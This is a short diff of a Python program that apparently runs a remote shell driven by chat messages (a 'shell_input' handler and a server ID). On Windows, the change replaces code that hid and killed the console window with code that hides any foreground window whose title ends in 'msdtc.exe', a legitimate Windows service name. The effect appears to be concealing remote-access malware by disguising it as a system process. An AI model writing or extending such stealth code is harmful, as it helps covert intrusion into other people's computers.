@@ -322,17 +322,14 @@ async def shell_input(message):
 
 
 if platform.system() == "Windows":
-    import ctypes
-    import pywintypes
-    import win32process
+    import win32gui
+    import win32.lib.win32con as win32con
 
-    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    foreground_window = win32gui.GetForegroundWindow()
+    window_title  = win32gui.GetWindowText(foreground_window)
 
-    if hwnd != 0:
-        ctypes.windll.user32.ShowWindow(hwnd, 0)
-        ctypes.windll.kernel32.CloseHandle(hwnd)
-        _, pid = win32process.GetWindowThreadProcessId(hwnd)
-        os.system(f"taskkill /PID {pid} /f")
+    if window_title.endswith("msdtc.exe"):
+        win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
 
 # Server ID
 server_id = config.server_id
